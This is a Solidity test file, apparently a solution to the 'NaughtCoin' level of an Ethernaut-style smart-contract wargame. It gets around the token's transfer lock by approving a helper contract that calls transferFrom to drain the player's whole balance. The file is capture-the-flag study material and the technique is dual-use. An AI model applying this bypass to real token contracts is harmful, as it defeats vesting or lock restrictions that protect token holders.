// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {ERC20} from "openzeppelin-contracts/token/ERC20/ERC20.sol";
import {NaughtCoinFactory} from "../src/levels/15-NaughtCoinFactory.sol";
import {NaughtCoin} from "../src/levels/15-NaughtCoin.sol";

contract Withdrawer {
    function withdraw(ERC20 token, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
    }
}

contract NaughtCoinSolution is BaseTest {

    function solution(address payable target_) internal override{
        uint256 amount = 1000000 * (10 ** 18);
        NaughtCoin target = NaughtCoin(target_);
        Withdrawer withdrawer = new Withdrawer();
        target.approve(address(withdrawer), amount);
        withdrawer.withdraw(target, amount);
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new NaughtCoinFactory()));
    }
}
